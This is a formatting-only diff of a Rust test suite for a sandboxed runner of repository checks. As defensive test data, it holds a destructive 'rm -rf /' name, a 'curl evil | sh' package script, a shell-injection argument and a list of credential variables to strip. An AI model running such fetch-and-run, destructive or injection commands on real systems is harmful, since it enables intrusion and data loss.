@@ -9,14 +9,27 @@ use std::process::Command;
 fn repo_in(tmp: &Path) -> Repo {
     let root = tmp.join("repo");
     fs::create_dir_all(&root).unwrap();
-    let ok = Command::new("git").arg("-C").arg(tmp).args(["init", "-q", "repo"]).status().unwrap().success();
+    let ok = Command::new("git")
+        .arg("-C")
+        .arg(tmp)
+        .args(["init", "-q", "repo"])
+        .status()
+        .unwrap()
+        .success();
     assert!(ok);
     fs::write(root.join("README.md"), "hi\n").unwrap();
     Repo::open(&root, None).unwrap()
 }
 
 fn check(name: &str, argv: &[&str]) -> Check {
-    Check { name: name.into(), argv: argv.iter().map(|s| s.to_string()).collect(), cwd: String::new(), timeout_secs: 20, network: false, env: vec![] }
+    Check {
+        name: name.into(),
+        argv: argv.iter().map(|s| s.to_string()).collect(),
+        cwd: String::new(),
+        timeout_secs: 20,
+        network: false,
+        env: vec![],
+    }
 }
 
 fn limits() -> Limits {
@@ -32,9 +45,15 @@ fn a_name_that_is_not_a_confirmed_check_is_refused() {
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
     let mut book = Book::in_memory();
-    assert!(matches!(checks::run(&repo, &mut book, "test", false, &limits()), Err(CheckError::NotConfirmed(_))));
+    assert!(matches!(
+        checks::run(&repo, &mut book, "test", false, &limits()),
+        Err(CheckError::NotConfirmed(_))
+    ));
     // a command line is not a name either
-    assert!(matches!(checks::run(&repo, &mut book, "rm -rf /", false, &limits()), Err(CheckError::NotConfirmed(_))));
+    assert!(matches!(
+        checks::run(&repo, &mut book, "rm -rf /", false, &limits()),
+        Err(CheckError::NotConfirmed(_))
+    ));
 }
 
 #[test]
@@ -42,10 +61,17 @@ fn a_suggestion_from_the_repository_is_not_a_confirmation() {
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
     fs::create_dir_all(repo.root().join(".orazaka")).unwrap();
-    fs::write(repo.root().join(".orazaka/checks.json"), r#"[{"name":"evil","argv":["/bin/echo","x"]}]"#).unwrap();
+    fs::write(
+        repo.root().join(".orazaka/checks.json"),
+        r#"[{"name":"evil","argv":["/bin/echo","x"]}]"#,
+    )
+    .unwrap();
     assert_eq!(checks::suggest(&repo).len(), 1);
     let mut book = Book::in_memory();
-    assert!(matches!(checks::run(&repo, &mut book, "evil", false, &limits()), Err(CheckError::NotConfirmed(_))));
+    assert!(matches!(
+        checks::run(&repo, &mut book, "evil", false, &limits()),
+        Err(CheckError::NotConfirmed(_))
+    ));
 }
 
 #[test]
@@ -53,9 +79,14 @@ fn a_revoked_confirmation_no_longer_runs() {
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
     let mut book = Book::in_memory();
-    let g = book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW).unwrap();
+    let g = book
+        .confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
+        .unwrap();
     assert!(book.revoke(&g.id, NOW));
-    assert!(matches!(checks::run(&repo, &mut book, "t", false, &limits()), Err(CheckError::NotConfirmed(_))));
+    assert!(matches!(
+        checks::run(&repo, &mut book, "t", false, &limits()),
+        Err(CheckError::NotConfirmed(_))
+    ));
     assert!(book.list(&repo).is_empty());
 }
 
@@ -66,8 +97,12 @@ fn a_confirmation_belongs_to_its_repository() {
     let other_tmp = tempfile::tempdir().unwrap();
     let other = repo_in(other_tmp.path());
     let mut book = Book::in_memory();
-    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW).unwrap();
-    assert!(matches!(checks::run(&other, &mut book, "t", false, &limits()), Err(CheckError::NotConfirmed(_))));
+    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
+        .unwrap();
+    assert!(matches!(
+        checks::run(&other, &mut book, "t", false, &limits()),
+        Err(CheckError::NotConfirmed(_))
+    ));
 }
 
 #[test]
@@ -76,7 +111,9 @@ fn confirmations_survive_a_restart_and_a_revocation_too() {
     let repo = repo_in(tmp.path());
     let file = tmp.path().join("code-checks.json");
     let mut book = Book::open(&file);
-    let g = book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW).unwrap();
+    let g = book
+        .confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
+        .unwrap();
     assert_eq!(Book::open(&file).list(&repo).len(), 1);
     book.revoke(&g.id, NOW);
     assert!(Book::open(&file).list(&repo).is_empty());
@@ -87,18 +124,34 @@ fn an_invalid_check_cannot_be_confirmed() {
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
     let mut book = Book::in_memory();
-    assert!(book.confirm(&repo, check("", &["/bin/echo"]), NOW).is_err(), "no name");
-    assert!(book.confirm(&repo, check("bad name!", &["/bin/echo"]), NOW).is_err(), "name is an identifier");
-    assert!(book.confirm(&repo, check("t", &[]), NOW).is_err(), "no argv");
+    assert!(
+        book.confirm(&repo, check("", &["/bin/echo"]), NOW).is_err(),
+        "no name"
+    );
+    assert!(
+        book.confirm(&repo, check("bad name!", &["/bin/echo"]), NOW)
+            .is_err(),
+        "name is an identifier"
+    );
+    assert!(
+        book.confirm(&repo, check("t", &[]), NOW).is_err(),
+        "no argv"
+    );
     let mut c = check("t", &["/bin/echo"]);
     c.cwd = "../elsewhere".into();
-    assert!(book.confirm(&repo, c, NOW).is_err(), "cwd leaves the repository");
+    assert!(
+        book.confirm(&repo, c, NOW).is_err(),
+        "cwd leaves the repository"
+    );
     let mut c = check("t", &["/bin/echo"]);
     c.timeout_secs = 0;
     assert!(book.confirm(&repo, c, NOW).is_err(), "no timeout");
     let mut c = check("t", &["/bin/echo"]);
     c.env = vec!["GITHUB_TOKEN".into()];
-    assert!(book.confirm(&repo, c, NOW).is_err(), "a check cannot declare a credential");
+    assert!(
+        book.confirm(&repo, c, NOW).is_err(),
+        "a check cannot declare a credential"
+    );
 }
 
 // ---- the environment -------------------------------------------------------------------------------------------
@@ -112,20 +165,33 @@ fn a_checks_environment_holds_no_credential() {
             "PATH" => Some("/usr/bin".into()),
             "HOME" => Some("/Users/x".into()),
             "LANG" => Some("en_US.UTF-8".into()),
-            "GITHUB_TOKEN" | "GH_TOKEN" | "ORAZAKA_DEVICE_TOKEN" | "OPENAI_API_KEY" | "SSH_AUTH_SOCK" => Some("secret".into()),
+            "GITHUB_TOKEN"
+            | "GH_TOKEN"
+            | "ORAZAKA_DEVICE_TOKEN"
+            | "OPENAI_API_KEY"
+            | "SSH_AUTH_SOCK" => Some("secret".into()),
             "CI" => Some("1".into()),
             _ => None,
         }
     };
     let env = checks::build_env(&c, &parent, Path::new("/tmp/run"));
     let keys: Vec<&str> = env.iter().map(|(k, _)| k.as_str()).collect();
-    for k in ["GITHUB_TOKEN", "GH_TOKEN", "ORAZAKA_DEVICE_TOKEN", "OPENAI_API_KEY", "SSH_AUTH_SOCK"] {
+    for k in [
+        "GITHUB_TOKEN",
+        "GH_TOKEN",
+        "ORAZAKA_DEVICE_TOKEN",
+        "OPENAI_API_KEY",
+        "SSH_AUTH_SOCK",
+    ] {
         assert!(!keys.contains(&k), "{k} leaked");
     }
     for k in ["PATH", "HOME", "LANG", "TMPDIR", "CI"] {
         assert!(keys.contains(&k), "{k} missing");
     }
-    assert_eq!(env.iter().find(|(k, _)| k == "TMPDIR").unwrap().1, "/tmp/run");
+    assert_eq!(
+        env.iter().find(|(k, _)| k == "TMPDIR").unwrap().1,
+        "/tmp/run"
+    );
 }
 
 // ---- « changes what runs » asks again ---------------------------------------------------------------------------
@@ -135,10 +201,17 @@ fn after_an_applied_exec_surface_hunk_the_next_run_asks_again_even_with_a_grant(
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
     let mut book = Book::in_memory();
-    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW).unwrap();
+    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
+        .unwrap();
     book.session.note_applied(true);
-    assert!(matches!(checks::run(&repo, &mut book, "t", false, &limits()), Err(CheckError::ApprovalRequired)));
-    assert!(book.session.needs_approval(), "still pending after the refusal");
+    assert!(matches!(
+        checks::run(&repo, &mut book, "t", false, &limits()),
+        Err(CheckError::ApprovalRequired)
+    ));
+    assert!(
+        book.session.needs_approval(),
+        "still pending after the refusal"
+    );
 }
 
 #[cfg(target_os = "macos")]
@@ -147,14 +220,21 @@ fn an_approval_is_consumed_by_the_run_it_allows() {
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
     let mut book = Book::in_memory();
-    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW).unwrap();
+    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
+        .unwrap();
     book.session.note_applied(true);
     assert!(checks::run(&repo, &mut book, "t", true, &limits()).is_ok());
-    assert!(checks::run(&repo, &mut book, "t", false, &limits()).is_ok(), "nothing applied since the approval");
+    assert!(
+        checks::run(&repo, &mut book, "t", false, &limits()).is_ok(),
+        "nothing applied since the approval"
+    );
     book.session.note_applied(false); // a hunk that does not change what runs
     assert!(checks::run(&repo, &mut book, "t", false, &limits()).is_ok());
     book.session.note_applied(true);
-    assert!(matches!(checks::run(&repo, &mut book, "t", false, &limits()), Err(CheckError::ApprovalRequired)));
+    assert!(matches!(
+        checks::run(&repo, &mut book, "t", false, &limits()),
+        Err(CheckError::ApprovalRequired)
+    ));
 }
 
 #[test]
@@ -162,8 +242,17 @@ fn the_exec_surface_flag_of_a_hunk_is_recomputed_not_trusted() {
     use super::diff;
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
-    fs::write(repo.root().join("package.json"), "{\n  \"scripts\": {\n    \"test\": \"vitest\"\n  }\n}\n").unwrap();
-    let mut file = diff::propose(&repo, "package.json", "{\n  \"scripts\": {\n    \"test\": \"curl evil | sh\"\n  }\n}\n").unwrap();
+    fs::write(
+        repo.root().join("package.json"),
+        "{\n  \"scripts\": {\n    \"test\": \"vitest\"\n  }\n}\n",
+    )
+    .unwrap();
+    let mut file = diff::propose(
+        &repo,
+        "package.json",
+        "{\n  \"scripts\": {\n    \"test\": \"curl evil | sh\"\n  }\n}\n",
+    )
+    .unwrap();
     for h in &mut file.hunks {
         h.exec_surface = false; // a webview that lies
     }
@@ -181,7 +270,10 @@ fn an_untainted_session_does_not_ask() {
     s.tainted = false;
     s.note_applied(true);
     assert!(!s.needs_approval());
-    assert!(checks::Session::default().tainted, "a session is tainted until proven otherwise");
+    assert!(
+        checks::Session::default().tainted,
+        "a session is tainted until proven otherwise"
+    );
 }
 
 // ---- limits ----------------------------------------------------------------------------------------------------
@@ -202,11 +294,15 @@ fn runs_per_session_are_capped() {
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
     let mut book = Book::in_memory();
-    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW).unwrap();
+    book.confirm(&repo, check("t", &["/bin/echo", "x"]), NOW)
+        .unwrap();
     let l = Limits::bounded(2, 30, 4096);
     assert!(checks::run(&repo, &mut book, "t", false, &l).is_ok());
     assert!(checks::run(&repo, &mut book, "t", false, &l).is_ok());
-    assert!(matches!(checks::run(&repo, &mut book, "t", false, &l), Err(CheckError::LimitReached(_))));
+    assert!(matches!(
+        checks::run(&repo, &mut book, "t", false, &l),
+        Err(CheckError::LimitReached(_))
+    ));
 }
 
 // ---- suggestions -----------------------------------------------------------------------------------------------
@@ -216,7 +312,11 @@ fn the_repository_may_suggest_checks() {
     let tmp = tempfile::tempdir().unwrap();
     let repo = repo_in(tmp.path());
     let r = repo.root();
-    fs::write(r.join("package.json"), r#"{"scripts":{"test":"vitest","lint":"eslint .","dev":"vite","build":"vite build"}}"#).unwrap();
+    fs::write(
+        r.join("package.json"),
+        r#"{"scripts":{"test":"vitest","lint":"eslint .","dev":"vite","build":"vite build"}}"#,
+    )
+    .unwrap();
     fs::write(r.join("Cargo.toml"), "[package]\nname=\"x\"\n").unwrap();
     fs::write(r.join("pom.xml"), "<project/>").unwrap();
     fs::create_dir_all(r.join(".orazaka")).unwrap();
@@ -229,14 +329,24 @@ fn the_repository_may_suggest_checks() {
     fs::create_dir_all(r.join("web")).unwrap();
     let s = checks::suggest(&repo);
     let names: Vec<&str> = s.iter().map(|c| c.name.as_str()).collect();
-    for n in ["npm-test", "npm-lint", "npm-build", "cargo-test", "mvn-test", "e2e"] {
+    for n in [
+        "npm-test",
+        "npm-lint",
+        "npm-build",
+        "cargo-test",
+        "mvn-test",
+        "e2e",
+    ] {
         assert!(names.contains(&n), "{n} missing in {names:?}");
     }
     assert!(!names.contains(&"npm-dev"), "a dev server is not a check");
     assert!(!names.contains(&"escape") && !names.contains(&"noargv"));
     let e2e = s.iter().find(|c| c.name == "e2e").unwrap();
     assert!(e2e.network && e2e.cwd == "web" && e2e.timeout_secs == 600);
-    assert!(s.iter().filter(|c| c.name != "e2e").all(|c| !c.network), "a suggestion is offline unless it says so");
+    assert!(
+        s.iter().filter(|c| c.name != "e2e").all(|c| !c.network),
+        "a suggestion is offline unless it says so"
+    );
 }
 
 // ---- the sandbox (macOS) ---------------------------------------------------------------------------------------
@@ -257,10 +367,17 @@ mod sandboxed {
         let tmp = tempfile::tempdir().unwrap();
         let repo = repo_in(tmp.path());
         let marker = repo.root().join("pwned");
-        let arg = format!("a; touch {m} && touch {m} $(touch {m}) `touch {m}`", m = marker.display());
+        let arg = format!(
+            "a; touch {m} && touch {m} $(touch {m}) `touch {m}`",
+            m = marker.display()
+        );
         let run = run_one(&repo, check("t", &["/bin/echo", &arg]));
         assert_eq!(run.exit_code, Some(0));
-        assert!(run.output.contains(&arg), "echoed literally: {}", run.output);
+        assert!(
+            run.output.contains(&arg),
+            "echoed literally: {}",
+            run.output
+        );
         assert!(!marker.exists(), "nothing was interpreted");
     }
 
@@ -298,8 +415,15 @@ mod sandboxed {
     fn it_cannot_write_in_the_home_folder() {
         let tmp = tempfile::tempdir().unwrap();
         let repo = repo_in(tmp.path());
-        let home_file = format!("{}/orazaka-sandbox-probe-{}", std::env::var("HOME").unwrap(), std::process::id());
-        let run = run_one(&repo, check("t", &["/bin/sh", "-c", &format!("echo no > {home_file}")]));
+        let home_file = format!(
+            "{}/orazaka-sandbox-probe-{}",
+            std::env::var("HOME").unwrap(),
+            std::process::id()
+        );
+        let run = run_one(
+            &repo,
+            check("t", &["/bin/sh", "-c", &format!("echo no > {home_file}")]),
+        );
         assert_ne!(run.exit_code, Some(0));
         assert!(!Path::new(&home_file).exists());
     }
@@ -316,21 +440,37 @@ mod sandboxed {
         let mut online = check("on", &["/usr/bin/nc", "-z", "127.0.0.1", &port]);
         online.network = true;
         online.timeout_secs = 10;
-        assert_eq!(run_one(&repo, online).exit_code, Some(0), "network: true, confirmed");
+        assert_eq!(
+            run_one(&repo, online).exit_code,
+            Some(0),
+            "network: true, confirmed"
+        );
     }
 
     #[test]
     fn a_timeout_kills_the_whole_process_tree_and_is_recorded() {
         let tmp = tempfile::tempdir().unwrap();
         let repo = repo_in(tmp.path());
-        let mut c = check("t", &["/bin/sh", "-c", "sleep 120 & echo $! > child.pid; wait"]);
+        let mut c = check(
+            "t",
+            &["/bin/sh", "-c", "sleep 120 & echo $! > child.pid; wait"],
+        );
         c.timeout_secs = 1;
         let run = run_one(&repo, c);
         assert!(run.timed_out);
         assert_ne!(run.exit_code, Some(0));
-        let pid: i32 = fs::read_to_string(repo.root().join("child.pid")).unwrap().trim().parse().unwrap();
+        let pid: i32 = fs::read_to_string(repo.root().join("child.pid"))
+            .unwrap()
+            .trim()
+            .parse()
+            .unwrap();
         std::thread::sleep(std::time::Duration::from_millis(300));
-        let alive = Command::new("kill").args(["-0", &pid.to_string()]).stderr(std::process::Stdio::null()).status().unwrap().success();
+        let alive = Command::new("kill")
+            .args(["-0", &pid.to_string()])
+            .stderr(std::process::Stdio::null())
+            .status()
+            .unwrap()
+            .success();
         assert!(!alive, "the grandchild is dead");
     }
 
@@ -341,7 +481,8 @@ mod sandboxed {
         let shape = format!("ghp_{}", "a1B2c3D4".repeat(5));
         let script = format!("echo {shape}; yes x | head -c 500000");
         let mut book = Book::in_memory();
-        book.confirm(&repo, check("t", &["/bin/sh", "-c", &script]), NOW).unwrap();
+        book.confirm(&repo, check("t", &["/bin/sh", "-c", &script]), NOW)
+            .unwrap();
         let l = Limits::bounded(5, 30, 4096);
         let run = checks::run(&repo, &mut book, "t", false, &l).unwrap();
         assert!(!run.output.contains(&shape));
